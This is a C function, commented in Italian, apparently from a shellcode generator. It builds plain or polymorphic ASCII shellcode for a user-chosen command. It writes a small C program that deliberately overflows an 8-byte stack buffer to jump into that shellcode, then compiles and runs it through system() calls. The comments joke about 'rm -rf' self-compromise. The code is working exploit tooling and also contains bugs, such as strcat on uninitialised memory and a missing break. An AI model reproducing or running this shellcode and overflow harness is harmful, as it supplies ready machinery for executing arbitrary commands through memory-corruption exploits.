// Questa funzione serve per testare l'effetiva efficacia
// dello shellcode appena generato.
// Per fare il tutto viene creato un file in C che simula (e 
// in effetti crea veramente) un buffer overflow, quindi non
// provate a usare --test con comandi come rm -rf, che sennò
// vi autopwnate.

void testc(char *cmd, char *shellpath, bool setuid, int type) {
	int i, l, size, k;
	char *shellcode, *code, tmp[20];
	FILE *fp;
	__u8 *shellc;
	// Viene rigenerato lo shellcode a seconda
	// del tipo richiesto dall'utente.
	switch (type) {
		case 0:
			shellc = shc_gen (cmd, shellpath, setuid, &l);
			size = l+pushed_bytes (cmd, shellpath)-28;
			code = (char *) malloc (l*4+3+(l-(l%10))/5);
			strcat (code, "\\\n");
			for (i=0;i<l;i++) {
				if (((i+2)%10==1)||(i==l-1))
					sprintf (tmp, "\\x%.2x\\\n", shellc[i]);
				else
					sprintf (tmp, "\\x%.2x", shellc[i]);
				strcat (code, tmp);
			}
			break;
		case 1:
			l = 24-pushed_bytes (cmd, shellpath)-0x20;
			shellcode = polyasc_gen (cmd, shellpath, 0 /*stuid*/, l, 0x20);
			size = strlen (shellcode);
			k = size+1;
			code = (char *) malloc (k);
			for(i=0;i<size;i++){
				if((shellcode[i]=='"') || (shellcode[i]==0x5c)){
					code = (char *) realloc(code, ++k);
					code [i+(k-2-size)] = 0x5c;
				}
				code [i+(k-1-size)] = shellcode[i];
			}
			code[k-1]=0x00;
			break;
		case 2: 
			shellc = shc_gen (cmd, shellpath, setuid, &l);
			shellcode = shc2polyascprint (shellc, l, 0, 24-((l%4==0) ? l:(l-(l%4)+4)));
			size = strlen (shellcode);
			k = size+1;
			code = (char *) malloc (k);
			for(i=0;i<size;i++){
				if((shellcode[i]=='"') || (shellcode[i]==0x5c)){
					code = (char *) realloc (code, ++k);
					code [i+(k-2-size)] = 0x5c;
				}
				code [i+(k-1-size)] = shellcode[i];
			}
			code [k-1] = 0x00;
		default:
			break;
	}
	// Viene creato un file di nome .debug.c, che contiene
	// al suo interno il codice sottostante.
	fp = fopen (".debug.c", "w");
	fprintf (fp, "#include <stdio.h>\n"
		    "#include <string.h>\n"
		    "#define SIZE %d\n\n"
		    "#define SHCD \"%s\"\n"
		    "void bof();\n"
		    "int main(){\n"
		    "	bof();\n"
		    "	return 0;\n"
		    "}\n"
		    "void bof(){\n"
		    "	char boff[8],shellcode[SIZE]=SHCD, *p=shellcode;\n"
		    "	strcpy(boff, \"aaaaaaaaaaaaaaaaaaaa\");\n"
		    "	memmove(boff+20, &p, 4);\n"
		    "}\n\n", size, code);
	fclose (fp);
	// Viene compilato
	// (è solo un banale system.. che vi aspettavate?)
	system ("gcc -o .debug .debug.c");
	printf ("[...]Testing the shellcode by running a controlled buffer overflow\n"
	       "[...]It's to late to stop the execusion if you are testing a dangerous shellcode...\n"
	       "[...] Good luck!\n\n");
	// Ovviamente poi viene eseguito..
	system ("./.debug");
	printf ("\n[...]test done.\n");
	// E infine si cancellano i file temporanei
	remove (".debug.c");
	remove (".debug");
}

